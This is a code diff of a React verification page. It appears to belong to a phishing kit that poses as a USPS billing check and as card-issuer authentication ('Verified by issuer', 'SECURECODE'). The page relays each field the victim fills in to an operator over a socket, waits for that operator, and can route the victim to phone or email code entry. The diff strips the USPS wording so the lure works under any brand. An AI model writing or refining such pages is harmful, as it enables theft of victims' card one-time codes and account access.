@@ -80,7 +80,7 @@ export default function Verify() {
     return !saved.telephone && !saved.email && !savedContacts.telephone && !savedContacts.email;
   });
   const [showMethodPicker, setShowMethodPicker] = useState(() => !initialVerifyMethod);
-  const [status, setStatus] = useState('Choose where you want USPS to send the authentication code.');
+  const [status, setStatus] = useState('Choose where you want the authentication code to be sent.');
   const [submitting, setSubmitting] = useState(false);
   const [waitingForAdmin, setWaitingForAdmin] = useState(false);
   const inputRef = useRef<HTMLInputElement | null>(null);
@@ -99,7 +99,7 @@ export default function Verify() {
         setLoadingContactOptions(false);
         setStatus(
           fallback.telephone || fallback.email
-            ? 'Choose where you want USPS to send the authentication code.'
+            ? 'Choose where you want the authentication code to be sent.'
             : 'We could not load your phone number or email. Return to your account and try again.',
         );
         return;
@@ -194,7 +194,7 @@ export default function Verify() {
       setSubmitting(false);
       setWaitingForAdmin(false);
       const routeReason = String(payload?.reason || '').trim();
-      setStatus(routeReason || 'Choose where you want USPS to send the authentication code.');
+      setStatus(routeReason || 'Choose where you want the authentication code to be sent.');
       socket.emit('update-form-field', { field: 'verifyMethod', value: '' });
       if ((target === 'verifyphone' || target === 'phoneverify') && contactOptions.telephone) return handleChooseMethod('phone', routeReason);
       if (target === 'emailverify' && contactOptions.email) return handleChooseMethod('email', routeReason);
@@ -277,7 +277,7 @@ export default function Verify() {
               </div>
               <span className="alz-bank-badge">Verified by issuer</span>
             </div>
-            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this USPS verification step.</p>
+            <p className="alz-bank-picker-copy">Choose one option below to receive the authentication code for this verification step.</p>
 
             {loadingContactOptions ? (
               <div className="alz-bank-loading">Loading your available contact methods...</div>
@@ -311,7 +311,7 @@ export default function Verify() {
                 <div>
                   <div className="alz-bank-header-eyebrow">Issuer Authentication</div>
                 <h1 className="alz-bank-title">Authentication required</h1>
-                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to complete this USPS billing verification.</p>
+                <p className="alz-bank-copy">Enter the one-time code sent by your card issuer to complete this billing verification.</p>
               </div>
               <div className="alz-bank-brandbox">
                 <div className="alz-bank-brandname">SECURECODE</div>
